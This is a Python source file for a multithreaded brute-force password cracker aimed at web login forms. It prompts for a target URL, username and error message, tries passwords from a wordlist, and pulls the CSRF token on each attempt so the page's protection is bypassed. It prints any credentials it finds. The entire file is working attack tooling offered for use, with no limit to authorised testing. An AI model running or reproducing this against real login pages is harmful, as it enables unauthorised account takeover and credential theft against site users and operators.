######################################################################################################
# Title: Brute force                                                                                 #
# Author: Tanvir Hossain Antu                                                                        #
# Github : https://github.com/Antu7      
# If you use the code give me the credit please #
######################################################################################################

print (""" 

██████  ██████  ██    ██ ████████ ███████     ███████  ██████  ██████   ██████ ███████ 
██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
██████  ██████  ██    ██    ██    █████       █████   ██    ██ ██████  ██      █████   
██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
██████  ██   ██  ██████     ██    ███████     ██       ██████  ██   ██  ██████ ███████                                                            
                                                                            
                   Tanvir Hossain Antu
        https://github.com/Antu7/python-bruteForce


""")


import threading
import requests
import time
import sys
import re
import secrets
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed

class BruteForceCracker:
    def __init__(self, url, username, error_message, username_field="UserName", password_field="Password"):
        self.url = url
        self.username = username
        self.error_message = error_message
        self.username_field = username_field
        self.password_field = password_field
        self.csrf_detected = False
        
        # Display banner without sleep
        print(banner)

    def get_csrf_token(self, session):
        try:
            response = session.get(self.url)
            # Try to extract token using BeautifulSoup
            soup = BeautifulSoup(response.content, 'html.parser')
            
            # Look for common CSRF token field names
            csrf_field = soup.find('input', attrs={'name': re.compile(r'csrf|CSRF|token|_token', re.I)})
            if csrf_field and csrf_field.has_attr('value'):
                return csrf_field['name'], csrf_field['value']
            
            # Alternative method: look for meta tags
            meta_token = soup.find('meta', attrs={'name': re.compile(r'csrf|CSRF|token', re.I)})
            if meta_token and meta_token.has_attr('content'):
                return meta_token['name'], meta_token['content']
            
            # Last resort: try to find it in the HTML with regex
            match = re.search(r'name=["\'](_csrf|csrf_token|CSRF|token)["\'] value=["\'](.*?)["\']', response.text)
            if match:
                return match.group(1), match.group(2)
                
            return None, None
        except Exception as e:
            # print(f"Error getting CSRF token: {e}")
            return None, None

    def crack(self, password, verbose=False):
        # Create a new session for each attempt to avoid threading issues and ensure fresh cookies
        session = requests.Session()

        # Get a fresh CSRF token for each attempt
        token_name, token_value = self.get_csrf_token(session)
        
        # If CSRF was detected initially but extraction failed here, assume failure/error
        if self.csrf_detected and (not token_name or not token_value):
            # print(f"[-] Failed to retrieve CSRF token for password: {password}")
            return False

        # Prepare the login data
        data_dict = {
            self.username_field: self.username,
            self.password_field: password,
            "Log In": "submit"
        }
        
        # Add CSRF token if found
        if token_name and token_value:
            data_dict[token_name] = token_value
        
        try:
            # Make the login attempt
            response = session.post(self.url, data=data_dict)

            # Check status code first - 403 usually means CSRF failure or Forbidden
            if response.status_code == 403 or response.status_code >= 500:
                return False

            # Check if login was successful
            # Strategy:
            # 1. Check for specific error message (negative match)
            # 2. Check if we are still on the login page by looking for the password field (fallback negative match)

            response_text = response.text

            if self.error_message in str(response.content) or self.error_message in response_text:
                return False

            # Check for redirection
            # Normalize URLs by stripping query parameters and trailing slashes
            initial_url = self.url.split('?')[0].rstrip('/')
            final_url = response.url.split('?')[0].rstrip('/')

            if initial_url != final_url:
                # If we were redirected to a different path and didn't find the error message, assume success.
                if verbose:
                    print(f"\n[+] Success! (Redirected to {final_url})")
                    print("Username: ---> " + self.username)
                    print("Password: ---> " + password)
                return True

            # If explicit error message not found AND we are on the same URL path,
            # check if the response still contains a password input field.
            # If it does, we likely just re-rendered the login page (failed login).
            # This handles cases where the user-provided error message was typo'd or not visible in HTML source (e.g., hidden toaster).
            if re.search(r'<input[^>]+type=["\']password["\']', response_text, re.I):
                return False

            # If we get here, neither the error message nor the password field was found.
            # Assume success (redirected to dashboard, etc.)
            if verbose:
                print("\n[+] Success!")
                print("Username: ---> " + self.username)
                print("Password: ---> " + password)
            return True
        except Exception as e:
            # print(f"Request failed for {password}: {e}")
            return False

def crack_password_wrapper(password, cracker, counter_lock, counter):
    password = password.strip()
    with counter_lock:
        counter[0] += 1
        print(f"Trying: {cracker.username} : {password}")

    if cracker.crack(password, verbose=True):
        return True, password
    return False, password

def main():
    url = input("Enter Target Url: ")
    username = input("Enter Target Username: ")
    error = input("Enter Wrong Password Error Message: ")
    
    user_field = input("Enter Username Field Name (default: UserName): ").strip() or "UserName"
    pass_field = input("Enter Password Field Name (default: Password): ").strip() or "Password"

    print("\n[*] Initializing...")
    cracker = BruteForceCracker(url, username, error, user_field, pass_field)

    # Test CSRF detection once
    session = requests.Session()
    token_name, token_value = cracker.get_csrf_token(session)
    
    if token_name and token_value:
        print(f"[+] CSRF token found: {token_name}")
        print("[*] Will attempt to bypass by extracting and including token with each request\n")
        cracker.csrf_detected = True
    else:
        print("[-] No CSRF token found or using a different protection method\n")
        cracker.csrf_detected = False

    # Pre-flight check to prevent false positives
    print("[*] Verifying configuration with a random password...")
    random_pass = secrets.token_hex(8)

    # Use a fresh session for pre-flight check to simulate real attempt
    # We essentially "crack" a known wrong password.
    # If crack() returns True, it means it thinks the login was successful (False Positive).
    if cracker.crack(random_pass, verbose=False):
        print(f"\n[!] ERROR: False positive detected!")
        print(f"[!] The script detected 'Success' for a known wrong password ('{random_pass}').")
        print(f"[!] This means the script could not detect the login failure.")
        print(f"[!] Please check:")
        print(f"    1. Is the Error Message correct?")
        print(f"    2. Are the field names correct ({user_field}, {pass_field})?")
        print(f"    3. If the error is dynamic/hidden (e.g. toaster), the script fell back to checking for a password field but couldn't find one.")
        return
    else:
        print("[+] Configuration verified. Login failure was correctly detected.")

    try:
        f = open("passwords.txt", "r")
    except FileNotFoundError:
        print("Error: passwords.txt not found.")
        return

    counter = [0]
    counter_lock = threading.Lock()

    batch_size = 100
    max_workers = 10
    found = False

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        while True:
            # Read a batch of passwords
            batch = []
            for _ in range(batch_size):
                line = f.readline()
                if not line:
                    break
                batch.append(line)

            if not batch:
                break

            futures = {executor.submit(crack_password_wrapper, pwd, cracker, counter_lock, counter): pwd for pwd in batch}

            for future in as_completed(futures):
                success, password = future.result()
                if success:
                    found = True
                    print(f"Password found! Stopping...")
                    # Cancel remaining futures if possible (Python 3.9+)
                    if sys.version_info >= (3, 9):
                        executor.shutdown(wait=False, cancel_futures=True)
                    break

            if found:
                break

    f.close()
    if not found:
        print("\n[-] Password not found in list.")

if __name__ == '__main__':
    banner = """ 
                       Checking the Server !!        
        [+]█████████████████████████████████████████████████[+]
"""
    main()